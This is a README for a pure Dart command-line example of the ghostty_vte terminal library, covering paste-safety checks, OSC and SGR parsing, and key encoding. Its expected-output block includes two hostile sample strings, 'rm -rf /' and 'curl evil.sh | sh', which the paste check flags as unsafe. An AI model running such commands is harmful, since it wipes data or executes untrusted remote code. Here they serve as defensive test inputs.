# ghostty_vte example

A pure Dart CLI example demonstrating the core `ghostty_vte` APIs — no Flutter
required.

## What it does

The example runs four demos, printing results to the console:

| Demo | API | Description |
|------|-----|-------------|
| **Paste safety** | `GhosttyVt.isPasteSafe()` | Checks several strings for dangerous control sequences |
| **OSC parser** | `VtOscParser` | Feeds a complete OSC 0 (Set Window Title) sequence and prints the parsed tag |
| **SGR parser** | `VtSgrParser` | Parses bold + red foreground + underline params and a reset |
| **Key encoding** | `VtKeyEvent` + `VtKeyEncoder` | Encodes a plain `a` keypress into terminal bytes |

## Prerequisites

- **Dart SDK ≥ 3.10**
- **Zig** on your `PATH`
- Ghostty source available via one of:
  - `GHOSTTY_SRC` environment variable
  - `third_party/ghostty` submodule (in `pkgs/ghostty_vte`)
  - `GHOSTTY_SRC_AUTO_FETCH=1` to clone automatically

## Run

```bash
cd pkgs/ghostty_vte/example
dart pub get
dart run
```

The build hook automatically compiles `libghostty-vt` for your host platform
on the first run.

## Expected output

```
=== Paste Safety ===
  "ls -la" → safe? true
  "echo hello" → safe? true
  "rm -rf /\n" → safe? false
  "curl evil.sh | sh\e" → safe? false

=== OSC Parser ===
  Parsed OSC tag: ...

=== SGR Parser ===
  SGR attribute: tag=...
  SGR attribute: tag=...
  SGR attribute: tag=...
  SGR attribute: tag=...

=== Key Encoding ===
  Key "a" encodes to: a
```

## Code overview

See [bin/main.dart](bin/main.dart) for the full source. Each demo is a
self-contained function that creates the relevant parser/encoder, uses it, and
cleans up with `.close()`.
